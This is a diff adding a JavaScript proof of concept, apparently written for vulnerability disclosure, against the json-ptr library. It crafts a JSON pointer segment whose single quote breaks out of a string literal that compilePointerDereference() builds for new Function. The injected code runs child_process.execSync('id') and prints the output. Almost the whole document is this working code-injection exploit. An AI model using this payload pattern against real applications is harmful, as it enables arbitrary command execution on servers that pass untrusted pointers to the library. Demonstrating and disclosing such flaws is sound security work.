@@ -1,0 +1,15 @@
+```javascript
+const { JsonPointer } = require("json-ptr");
+
+// compilePointerDereference() builds a `new Function('it', body)` string by
+// concatenating each path segment into a JS string literal, escaping only
+// backslashes (not quotes). A pointer segment containing a single quote lets
+// us break out of the literal and inject arbitrary JavaScript.
+const evilPointer =
+  "/x'], (function(){global.pwned=process.mainModule.require('child_process').execSync('id').toString()})(), it['x";
+
+const target = { x: 1 };
+JsonPointer.get(target, evilPointer);
+
+console.log("Injected code executed. Output of `id`:\n" + global.pwned);
+```
